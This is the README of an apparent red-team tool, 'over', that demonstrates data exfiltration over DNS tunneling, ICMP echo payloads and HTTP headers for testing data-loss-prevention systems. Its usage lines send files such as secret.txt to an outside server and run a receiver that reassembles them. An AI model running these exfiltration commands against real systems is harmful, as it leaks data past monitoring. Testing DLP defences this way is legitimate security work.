## over

data exfiltration technique demonstrations for testing dlp systems. educational tool that demonstrates dns tunneling, icmp covert channels, and http steganography.

### usage

```
./over.sh -m dns -t your-server.com -d secret.txt -a <auth_token>
./over.sh -m icmp -t 10.0.0.1 -d data.bin -a <auth_token>

python3 over.py -m dns -t your-server.com -d data.txt -a <token>     # dns tunnel
python3 over.py -m dns-recv -t 0.0.0.0 -a <token>                    # dns receiver
python3 over.py -m icmp -t 10.0.0.1 -d data.bin -a <token>           # icmp channel
python3 over.py -m http -t your-server.com -d file.txt -a <token>    # http stego
```

### python modes

- dns: base32-encoded subdomain queries with raw dns packets
- dns-recv: reassemble exfiltrated data from dns queries
- icmp: data in icmp echo request payloads (requires root)
- http: data hidden in http headers and json body

### safety

authorization token required for all operations (min 16 chars). can also set OVER_AUTH_TOKEN env var. only use against your own infrastructure.
